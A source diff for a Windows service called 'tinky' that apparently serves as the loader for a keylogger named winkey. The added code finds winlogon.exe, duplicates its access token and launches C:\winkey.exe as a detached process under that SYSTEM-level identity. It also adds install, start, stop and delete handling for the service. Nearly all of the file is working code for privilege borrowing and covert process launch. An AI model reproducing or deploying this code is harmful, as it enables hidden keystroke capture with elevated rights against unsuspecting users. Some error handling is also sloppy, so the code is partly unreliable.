@@ -4,21 +4,28 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
+#include <iostream>
 #pragma comment(lib, "advapi32.lib")
 
 #define SVCNAME TEXT("tinky")
 #define WINKEY TEXT("winkey.exe")
 
 SC_HANDLE scManager;
-SERVICE_STATUS_HANDLE   g_StatusHandle;
-SERVICE_STATUS          g_ServiceStatus;
-HANDLE                  g_ServiceStopEvent;
-HANDLE                  newExecToken;
-PROCESS_INFORMATION     winkeyPI;
 
-VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
-VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode);
-void			ReportStatus(DWORD state, DWORD Q_ERROR);
+SERVICE_STATUS gSvcStatus;
+SERVICE_STATUS_HANDLE gSvcStatusHandle;
+HANDLE ghSvcStopEvent = nullptr;
+
+void WINAPI ServiceMain();
+void WINAPI ServiceInit();
+void WINAPI ServiceControlHandler(DWORD dwCtrl);
+void ServiceReportStatus(DWORD dwCurrentState,
+	DWORD dwWin32ExitCode,
+	DWORD dwWaitHint);
+HANDLE ServiceGetToken();
+void ServiceStartProcess(STARTUPINFO* si,
+	PROCESS_INFORMATION* pi);
+
 
 int usage(int ac, char** av)
 {
@@ -54,11 +61,8 @@ int usage(int ac, char** av)
 		}
 	}
 	else if (ac == 1)
-	{
-		printf("install\n");
-		return (1);
-	}
-	return (0);
+		return (0);
+	return (-1);
 }
 
 int assign_scManager()
@@ -80,30 +84,27 @@ int assign_scManager()
 
 // Create and install service tinky --- 
 
-int install_sc(char* path)
+void install_sc()
 {
 	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
 	if (scService)
 	{
 		printf("Service %s exists.\n", SVCNAME);
-		return (1);
 	}
 	scService = CreateService(scManager, SVCNAME, SVCNAME,
 		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
 		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-		path, NULL, NULL, NULL, NULL, NULL);
+		"C:\\tinky.exe", NULL, NULL, NULL, NULL, NULL);
 	if (!scService)
 	{
 		printf("CreateService failed error (%ld)\n", GetLastError());
-		return (1);
 	}
 	printf("Service %s installed successfully.\n", SVCNAME);
-	return (0);
 }
 
 //Start service // need dispatcher before start : https://stackoverflow.com/questions/1640114/startservice-fails-with-error-code-1053
 
-int start_sc(void)
+void start_sc(void)
 {
 	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
 	if (scService)
@@ -117,7 +118,6 @@ int start_sc(void)
 				printf("StartService failed error (%ld)\n", err);
 			if (!CloseServiceHandle(scService))
 				printf("CloseServiceHandle failed error (%ld)\n", err);
-			return (1);
 		}
 		printf("Service %s started successfully.\n", SVCNAME);
 		if (!CloseServiceHandle(scService))
@@ -125,16 +125,108 @@ int start_sc(void)
 	}
 	else
 		printf("Service %s is not installed.\n", SVCNAME);
-	return (0);
 }
 
-int delete_sc(void)
+void stop_sc()
+{
+	SERVICE_STATUS_PROCESS ssp;
+	DWORD dwBytesNeeded;
+	DWORD dwStartTime = GetTickCount();
+	DWORD dwTimeout = 30000;
+	DWORD dwWaitTime;
+	
+	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
+	if (scService == nullptr) {
+		return;
+	}
+	/* Check if service is started */
+	if (!QueryServiceStatusEx(
+		scService,
+		SC_STATUS_PROCESS_INFO,
+		(LPBYTE)&ssp,
+		sizeof(SERVICE_STATUS_PROCESS),
+		&dwBytesNeeded
+	)) {
+		printf("QueryServiceStatusEx failed (%ld)\n", GetLastError());
+		goto stop_cleanup;
+	}
+
+	if (ssp.dwCurrentState == SERVICE_STOPPED) {
+		printf("Service is already stopped\n");
+		goto stop_cleanup;
+	}
+
+	/* Wait for stoping service if pendind*/
+	while (ssp.dwCurrentState == SERVICE_STOP_PENDING) {
+		printf("Service stop pending...\n");
+		dwWaitTime = ssp.dwWaitHint / 10;
+		if (dwWaitTime < 1000)
+			dwWaitTime = 1000;
+		else if (dwWaitTime > 10000)
+			dwWaitTime = 10000;
+		Sleep(dwWaitTime);
+		if (!QueryServiceStatusEx(scService,
+			SC_STATUS_PROCESS_INFO,
+			(LPBYTE)&ssp,
+			sizeof(SERVICE_STATUS_PROCESS),
+			&dwBytesNeeded
+		)) {
+			printf("QueryServiceStatusEx failed %ld\n", GetLastError());
+			goto stop_cleanup;
+		}
+
+		if (ssp.dwCurrentState == SERVICE_STOPPED) {
+			printf("Service stopped successfully.\n");
+			goto stop_cleanup;
+		}
+
+		if (GetTickCount() - dwStartTime > dwTimeout) {
+			printf("Service stop timed out.\n");
+			goto stop_cleanup;
+		}
+	}
+	// send stop code
+	if (!ControlService(
+		scService,
+		SERVICE_CONTROL_STOP,
+		(LPSERVICE_STATUS)&ssp
+	)) {
+		printf("ControlService failed (%ld)\n", GetLastError());
+		goto stop_cleanup;
+	}
+	/* Wait service to stop */
+	while (ssp.dwCurrentState != SERVICE_STOPPED) {
+		Sleep(ssp.dwWaitHint);
+		if (!QueryServiceStatusEx(scService,
+			SC_STATUS_PROCESS_INFO,
+			(LPBYTE)&ssp,
+			sizeof(SERVICE_STATUS_PROCESS),
+			&dwBytesNeeded
+		)) {
+			printf("QueryServiceStatusEx failed (%ld)\n", GetLastError());
+			goto stop_cleanup;
+		}
+
+		if (ssp.dwCurrentState == SERVICE_STOPPED)
+			break;
+
+		if (GetTickCount() - dwStartTime > dwTimeout) {
+			printf("Wait timed out\n");
+			goto stop_cleanup;
+		}
+	}
+	printf("Service stopped successfully\n");
+
+	stop_cleanup:
+		CloseServiceHandle(scService);
+}
+
+void delete_sc(void)
 {
 	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
 	if (!scService)
 	{
 		printf("Service %s is not installed.\n", SVCNAME);
-		return (1);
 	}
 	SERVICE_STATUS	status;
 
@@ -149,7 +241,6 @@ int delete_sc(void)
 			else
 			{
 				printf("Service %s deleted successfully.\n", SVCNAME);
-				return (0);
 			}
 		}
 	}
@@ -157,133 +248,205 @@ int delete_sc(void)
 		printf("ControlService failed error (%ld)\n", GetLastError());
 	if (!CloseServiceHandle(scService))
 		printf("CloseServiceHandle failed error (%ld)\n", GetLastError());
-	return (1);
 }
 
 void do_op(int op)
 {
-	char		path[MAX_PATH];
-	
-	strcat_s(path, "\\tinky.exe");
 	if (op == 1)
-		install_sc(path);
+		install_sc();
 	else if (op == 2)
 		start_sc();
+	else if (op == 3)
+		stop_sc();
 	else if (op == 4)
+	{
+		stop_sc();
 		delete_sc();
-	else
-		printf("smtg else\n");
-}
-
-int findProc(const char* procname) {
-
-	HANDLE hSnapshot;
-	PROCESSENTRY32 pe;
-	int pid = 0;
-	BOOL hResult;
-
-	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
-	pe.dwSize = sizeof(PROCESSENTRY32);
-	hResult = Process32First(hSnapshot, &pe);
-	while (hResult) {
-		if (strcmp(procname, pe.szExeFile) == 0) {
-			pid = pe.th32ProcessID;
-			break;
-		}
-		hResult = Process32Next(hSnapshot, &pe);
-	}
-
-	CloseHandle(hSnapshot);
-	return pid;
-}
-
-void    launch_winkey() {
-	DWORD winlogonPID;
-	HANDLE wlPH;
-	HANDLE wlTH;
-
-	char* deb = "C:\\Users\\Public\\winkey.exe";
-	LPCSTR PP = deb;
-	STARTUPINFO Si;
-
-	ZeroMemory(&Si, sizeof(Si));
-	Si.cb = sizeof(Si);
-	winlogonPID = findProc("winlogon.exe");
-	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
-	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
-		printf("opt\n");
-	}
-	CloseHandle(wlPH);
-	if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
-		printf("dtEx\n");
-	}
-	CloseHandle(wlTH);
-	if (!CreateProcessAsUser(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &winkeyPI)) {
-		printf("cpwt (%ld)\n", GetLastError());
 	}
 }
 
-void    kill_winkey() {
-	DWORD winkeyPID;
-	HANDLE wkPH;
 
-	winkeyPID = findProc("winkey.exe");
-	wkPH = OpenProcess(PROCESS_TERMINATE, 0, winkeyPID);
-	TerminateProcess(wkPH, 1);
-	CloseHandle(wkPH);
-}
+void WINAPI ServiceMain()
+{
+	/* Save handle to edit the status later */
+	gSvcStatusHandle = RegisterServiceCtrlHandler(
+		SVCNAME,
+		reinterpret_cast<LPHANDLER_FUNCTION>(ServiceControlHandler)
+	);
 
-
-VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
-	if (dwArgc && lpszArgv[dwArgc]) {
-		int i;
-		i = 0;
-	}
-	g_StatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
-	if (g_StatusHandle == NULL) {
-		printf("Failed to register Service control handler to service manager\n");
+	if (!gSvcStatusHandle) {
+		printf("RegisterServiceCtrlHandler failed\n");
 		return;
 	}
-	ReportStatus(SERVICE_START_PENDING, NO_ERROR);
-	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-	if (g_ServiceStopEvent == NULL) {
-		ReportStatus(SERVICE_STOPPED, GetLastError());
-		return;
-	}
-	ReportStatus(SERVICE_RUNNING, NO_ERROR);
-	launch_winkey();
-	WaitForSingleObject(g_ServiceStopEvent, INFINITE);
-	ReportStatus(SERVICE_STOPPED, NO_ERROR);
+
+	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+	gSvcStatus.dwServiceSpecificExitCode = 0;
+	/* Set service to Pending */
+	ServiceReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
+	/* Init service and continue flow */
+	ServiceInit();
 }
 
-VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
-	switch (CtrlCode) {
+void WINAPI ServiceInit()
+{
+	/* Create event */
+	ghSvcStopEvent = CreateEvent(
+		nullptr,
+		TRUE,
+		FALSE,
+		nullptr
+	);
+	if (ghSvcStopEvent == nullptr) {
+		ServiceReportStatus(SERVICE_STOPPED, GetLastError(), 0);
+		return;
+	}
+	/* Set stat of running service */
+	ServiceReportStatus(SERVICE_RUNNING, NO_ERROR, 0);
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	/*Create proc to handle winkey */
+	ServiceStartProcess(&si, &pi);
+	/*Witing service to send stop request */
+	while (1) {
+		WaitForSingleObject(ghSvcStopEvent, INFINITE);
+		ServiceReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
+		break;
+	}
+	/* Force terminate process */
+	if (pi.hProcess) {
+		TerminateProcess(pi.hProcess, 0);
+	}
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	CloseHandle(si.hStdInput);
+	CloseHandle(si.hStdError);
+	CloseHandle(si.hStdOutput);
+}
+
+void WINAPI ServiceControlHandler(DWORD dwCtrl)
+{
+	switch (dwCtrl) {
 	case SERVICE_CONTROL_STOP:
-		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
-			break;
-		kill_winkey();
-		ReportStatus(SERVICE_STOPPED, NO_ERROR);
+		ServiceReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
+
+		SetEvent(ghSvcStopEvent);
+		ServiceReportStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
+
+		return;
+	case SERVICE_CONTROL_INTERROGATE:
 		break;
 	default:
 		break;
 	}
 }
 
-void ReportStatus(DWORD state, DWORD Q_ERROR) {
-	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-	g_ServiceStatus.dwControlsAccepted = 0;
-	if (state != SERVICE_START_PENDING) {
-		g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-	}
-	g_ServiceStatus.dwCurrentState = state;
-	g_ServiceStatus.dwWin32ExitCode = Q_ERROR;
-	g_ServiceStatus.dwServiceSpecificExitCode = 0;
-	g_ServiceStatus.dwCheckPoint = 0;
+void ServiceReportStatus(DWORD dwCurrentState,
+	DWORD dwWin32ExitCode,
+	DWORD dwWaitHint)
+{
+	static DWORD dwCheckPoint = 1;
 
-	SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+	gSvcStatus.dwCurrentState = dwCurrentState;
+	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
+	gSvcStatus.dwWaitHint = dwWaitHint;
+
+	if (dwCurrentState == SERVICE_START_PENDING) {
+		gSvcStatus.dwControlsAccepted = 0;
+	}
+	else {
+		gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+	}
+
+	if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) {
+		gSvcStatus.dwCheckPoint = 0;
+	}
+	else {
+		gSvcStatus.dwCheckPoint = ++dwCheckPoint;
+	}
+	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
 }
 
+/*
+	Source: https://stackoverflow.com/q/13480344
+*/
+HANDLE ServiceGetToken()
+{
+	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hProcessSnap == INVALID_HANDLE_VALUE) {
+		printf("CreateToolhelp32Snapshot failed (%ld)\n", GetLastError());
+		return nullptr;
+	}
+
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(hProcessSnap, &pe32)) {
+		printf("Process32First failed (%ld)\n", GetLastError());
+		CloseHandle(hProcessSnap);
+		return nullptr;
+	}
+
+	DWORD logonPID = 0;
+	do {
+		if (lstrcmpi(pe32.szExeFile, TEXT("winlogon.exe")) == 0) {
+			logonPID = pe32.th32ProcessID;
+			break;
+		}
+	} while (Process32Next(hProcessSnap, &pe32));
+	CloseHandle(hProcessSnap);
+	if (logonPID == 0) {
+		printf("Process32Next failed (%ld)\n", GetLastError());
+		return nullptr;
+	}
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, logonPID);
+	if (hProcess == nullptr) {
+		printf("OpenProcess failed (%ld)\n", GetLastError());
+		return nullptr;
+	}
+	HANDLE hToken = nullptr;
+	OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);
+	CloseHandle(hProcess);
+	if (hToken == nullptr) {
+		printf("OpenProcessToken failed (%ld)\n", GetLastError());
+		return nullptr;
+	}
+
+	/* Duplicate token using Impersonation */
+	HANDLE hTokenD = nullptr;
+	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenD);
+	CloseHandle(hToken);
+	if (hTokenD == nullptr) {
+		printf("DuplicateTokenEx failed (%ld)\n", GetLastError());
+		return nullptr;
+	}
+
+	return hTokenD;
+}
+
+void ServiceStartProcess(STARTUPINFO* si, PROCESS_INFORMATION* pi)
+{
+	/* Fetch impersonated token */
+	HANDLE hToken = ServiceGetToken();
+	if (hToken == nullptr) {
+		printf("GetToken failed (%ld)\n", GetLastError());
+		return;
+	}
+
+	/* Open the winkey process */
+	CreateProcessAsUser(hToken,
+		TEXT("C:\\winkey.exe"),
+		nullptr,
+		nullptr,
+		nullptr,
+		false,
+		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS,
+		NULL,
+		NULL,
+		si,
+		pi
+	);
+	CloseHandle(hToken);
+}
 int main(int ac, char** av)
 {
 	long int	err;
@@ -300,19 +463,13 @@ int main(int ac, char** av)
 			return (1);
 		}
 	}
-	else
-	{
-		SERVICE_TABLE_ENTRY ServiceStartTable[2];
-		ServiceStartTable[0].lpServiceName = SVCNAME;
-		ServiceStartTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
-		ServiceStartTable[1].lpServiceName = NULL;
-		ServiceStartTable[1].lpServiceProc = NULL;
-		if (StartServiceCtrlDispatcher(ServiceStartTable))
-			return 0;
-		else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
-			return -1; // Program not started as a service.
-		else
-			return -2; // Other error.
+	else {
+		SERVICE_TABLE_ENTRY DispatchTable[] = { {
+			const_cast<LPSTR>(SVCNAME),
+			reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(ServiceMain)},
+		{NULL, NULL}
+		};
+		StartServiceCtrlDispatcher(DispatchTable);
 	}
 	return 0;
 }
